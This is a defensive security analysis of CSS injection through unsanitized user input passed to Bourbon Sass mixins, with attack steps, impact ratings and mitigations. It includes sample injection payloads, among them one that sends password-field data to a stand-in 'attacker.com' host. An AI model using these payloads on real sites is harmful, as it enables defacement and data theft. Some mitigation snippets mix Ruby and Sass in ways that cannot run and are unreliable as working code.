## 2. Deep Analysis of Attack Tree Path: 1a. Unsanitized User Input to Mixins/Funcs

### 2.1. Vulnerability Definition

This vulnerability occurs when user-supplied data is directly incorporated into Bourbon mixins or functions without proper sanitization or validation.  Bourbon, a Sass library, provides mixins and functions to simplify CSS development.  However, if these mixins/functions are used to generate CSS based on user input, and that input is not properly handled, it can lead to CSS injection.

**Key Concept: CSS Injection**

CSS injection, while not as widely known as SQL injection or XSS, can still pose significant security risks.  An attacker can inject malicious CSS code that can:

*   **Deface the website:** Alter the layout, colors, and appearance of the application.
*   **Steal sensitive information:**  Use CSS selectors and attribute selectors to exfiltrate data displayed on the page (e.g., using `content: url(...)` to send data to an attacker-controlled server). This is particularly dangerous with dynamically generated content.
*   **Phishing:**  Overlay elements on the page to trick users into entering credentials or other sensitive information into fake forms.
*   **Denial of Service (DoS):**  Inject CSS that causes the browser to consume excessive resources, leading to crashes or unresponsiveness.  This could involve complex animations or large images.
*   **Bypass CSRF protections:** In some cases, carefully crafted CSS can be used to interact with hidden form elements, potentially bypassing CSRF tokens.
*  **Browser fingerprinting/tracking:** Inject CSS that reveals information about the user's browser, plugins, or system.

### 2.2. Code Review (Hypothetical Examples)

**Vulnerable Example 1 (Basic Injection):**

```scss
// Vulnerable Sass
@mixin set-width($width) {
  .element {
    width: $width;
  }
}

// User input (e.g., from a URL parameter):
// ?width=100px;%20}body{background-color:red;}/*

// Compiled CSS:
.element {
  width: 100px; } body{background-color:red;} /*;
}
```

**Vulnerable Example 2 (Attribute Selector Exfiltration):**

```scss
// Vulnerable Sass
@mixin set-background($url) {
  .element {
    background-image: url($url);
  }
}

// User input (highly crafted):
// ?url=');}}input[name="password"]{background-image:url('http://attacker.com/?

// Compiled CSS (simplified for clarity):
.element {
  background-image: url('');
}
}
input[name="password"] {
  background-image: url('http://attacker.com/?');
}
```
This example attempts to use a background image URL to send the value of the password field to the attacker's server.  The attacker would need to progressively guess characters of the password and observe network requests.

**Vulnerable Example 3 (Bourbon `position` mixin):**

```scss
// Vulnerable Sass
@import "bourbon";

@mixin set-position($position, $args...) {
  .element {
    @include position($position, $args...);
  }
}

// User input (e.g., from a form field):
// position=absolute&top=10px;%20}body{display:none;}/*

// Compiled CSS (simplified):
.element {
  position: absolute;
  top: 10px; } body{display:none;} /*;
}
```
This uses the Bourbon `position` mixin to inject CSS that hides the entire body of the page.

### 2.3. Attack Vector Analysis

1.  **Input Source:** The attacker identifies an input field, URL parameter, or other data source that is used within a Bourbon mixin or function.
2.  **Crafting Payload:** The attacker crafts a malicious CSS payload, designed to achieve a specific goal (e.g., defacement, data exfiltration, DoS).  This payload often involves escaping the intended CSS context (e.g., using `}` to close the current rule and start a new one).
3.  **Injection:** The attacker submits the payload through the identified input source.
4.  **CSS Compilation:** The Sass compiler processes the user input *without* sanitization, incorporating the malicious payload into the generated CSS.
5.  **Delivery:** The compiled CSS is delivered to the user's browser.
6.  **Execution:** The user's browser renders the malicious CSS, executing the attacker's intended actions.

### 2.4. Impact Assessment

*   **Confidentiality:**  Medium to High.  CSS injection can potentially be used to exfiltrate sensitive data displayed on the page.
*   **Integrity:** High.  The attacker can modify the appearance and functionality of the application, potentially leading to data corruption or manipulation.
*   **Availability:** Medium to High.  The attacker can cause the application to become unusable through DoS attacks or by hiding critical content.

### 2.5. Mitigation Strategies

1.  **Never Trust User Input:**  The fundamental principle is to treat all user input as potentially malicious.
2.  **Input Validation:**
    *   **Whitelist Approach (Strongly Recommended):**  Define a strict whitelist of allowed values for each input.  Reject any input that does not conform to the whitelist.  For example, if a mixin expects a color, only allow valid color names or hex codes.
    *   **Blacklist Approach (Less Reliable):**  Attempt to identify and block known malicious patterns.  This is generally less effective than whitelisting, as attackers can often find ways to bypass blacklists.
3.  **Input Sanitization/Escaping:**
    *   **CSS-Specific Escaping:**  Use a dedicated CSS escaping function to neutralize potentially dangerous characters.  Unfortunately, Sass does *not* have a built-in CSS escaping function.  You *must* implement this on the server-side before the data reaches the Sass compilation process.
    *   **Example (Ruby on Rails - Hypothetical):**
        ```ruby
        # In your controller or helper
        def sanitize_css_value(value)
          # This is a SIMPLIFIED example and may not be fully comprehensive.
          # A robust solution would require a dedicated CSS parsing library.
          value.gsub(/[^a-zA-Z0-9\s\-\.#]/, '') # Allow alphanumeric, spaces, hyphens, periods, and #
        end

        # In your Sass file:
        @mixin my-mixin($color) {
          .element {
            color: #{$color}; // Interpolation is still needed, but the value is pre-sanitized.
          }
        }

        // Usage:
        @include my-mixin(#{sanitize_css_value(params[:color])});
        ```
4.  **Context-Aware Output Encoding:** While primarily relevant for XSS, ensuring that the generated CSS is properly embedded within the HTML document (e.g., within `<style>` tags or as inline styles) can help prevent certain types of attacks.
5.  **Avoid Direct User Input in Mixins:**  If possible, refactor your code to avoid passing user input directly into mixins.  Instead, use user input to select from a predefined set of safe options.
    ```scss
    // Safer approach:
    $safe-colors: (
      "red": #f00,
      "blue": #00f,
      "green": #0f0,
    );

    @mixin set-color($color-key) {
      .element {
        color: map-get($safe-colors, $color-key);
      }
    }

    // User input (e.g., from a dropdown):
    // ?color=red

    // Usage:
    @if map-has-key($safe-colors, params[:color]) {
        @include set-color(params[:color]);
    } @else {
        // Handle invalid input (e.g., display an error, use a default color)
    }
    ```
6.  **Regular Security Audits:** Conduct regular security audits and code reviews to identify potential vulnerabilities.
7.  **Keep Bourbon Updated:** Ensure you are using the latest version of Bourbon to benefit from any security fixes.  However, remember that updating Bourbon alone will *not* solve this vulnerability if you are passing unsanitized user input.
8. **Content Security Policy (CSP):** Implement a strict CSP to limit the sources from which styles can be loaded. This can mitigate the impact of CSS injection by preventing the loading of external stylesheets or inline styles from untrusted sources.

### 2.6. Testing Recommendations

1.  **Static Analysis:** Use static analysis tools (e.g., linters, security-focused code analyzers) to identify potential instances of user input being passed to mixins.
2.  **Dynamic Analysis:**
    *   **Manual Penetration Testing:**  Manually attempt to inject malicious CSS payloads through various input fields and parameters.
    *   **Automated Vulnerability Scanning:**  Use automated web application vulnerability scanners to detect CSS injection vulnerabilities.
3.  **Fuzz Testing:**  Provide a wide range of unexpected and potentially malicious inputs to the application and monitor for unexpected behavior or errors.
4.  **Unit Tests:**  While difficult to test CSS injection directly with unit tests, you can write unit tests for your sanitization functions to ensure they are working correctly.
5. **Integration Tests:** Test the entire flow, from user input to CSS rendering, to ensure that sanitization is applied correctly at each stage.

## 3. Conclusion

Unsanitized user input passed to Bourbon mixins and functions represents a significant security risk, potentially leading to CSS injection attacks.  The most effective mitigation strategy is a combination of strict input validation (using a whitelist approach), server-side CSS escaping, and avoiding direct user input in mixins whenever possible.  Regular security testing and code reviews are crucial to identify and prevent this vulnerability.  A strong Content Security Policy adds an additional layer of defense. By implementing these recommendations, developers can significantly reduce the risk of CSS injection attacks in applications using Bourbon.
